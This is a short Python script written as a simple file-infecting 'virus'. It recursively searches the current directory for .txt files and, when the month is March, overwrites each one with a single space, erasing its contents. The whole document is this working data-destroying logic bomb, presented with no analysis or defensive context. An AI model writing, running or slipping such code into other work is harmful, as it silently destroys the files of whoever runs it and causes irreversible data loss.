import os
import datetime

path=os.path.abspath("")
filelist = os.listdir(path)

def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-4:] == ".txt":
            filestoinfect.append(path+"/"+fname)
    return filestoinfect

def infect(filestoinfect):
    virusstring = " "
    for fname in filestoinfect:
        f = open(fname,"w")
        f.write(virusstring)
        f.close()
        
def trigger(filestoinfect):
    if datetime.datetime.now().month == 3:
        infect(filestoinfect)
        
filestoinfect = search(os.path.abspath(""))
trigger(filestoinfect)